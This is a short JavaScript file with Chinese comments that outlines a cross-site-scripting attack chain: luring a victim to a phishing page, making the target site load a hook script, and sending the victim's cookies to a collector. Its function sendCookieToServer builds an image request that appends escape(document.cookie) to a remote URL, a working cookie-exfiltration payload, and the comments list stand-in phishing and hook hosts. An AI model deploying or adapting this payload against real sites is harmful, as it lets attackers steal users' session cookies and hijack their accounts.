/*
1. 诱导受害者访问钓鱼网站，
2. 触发目标站点下载hook.js 文件
3. 目标站点执行hook.js 文件，获取cookie
4. 发给hacker 站点

https://www.gofish.hack.net/index.jsp # 社工伪造钓鱼网站
https://www.hook.hack.net/xss_hook.js # hook 站点
*/

function sendCookieToServer() {
    //制作一个图片，图片连接即讲过cookie 发给服务端
    var img = new Image();
    var target_cookie = escape(document.cookie);
    var target_host = "http://target.vulhost.com/xss.php?sid=" // # 目标站点
    img.src = target_host + target_cookie;

    //var target_cookie = escape(document.cookie);
    //windows.location = target_host + target_cookie;
}

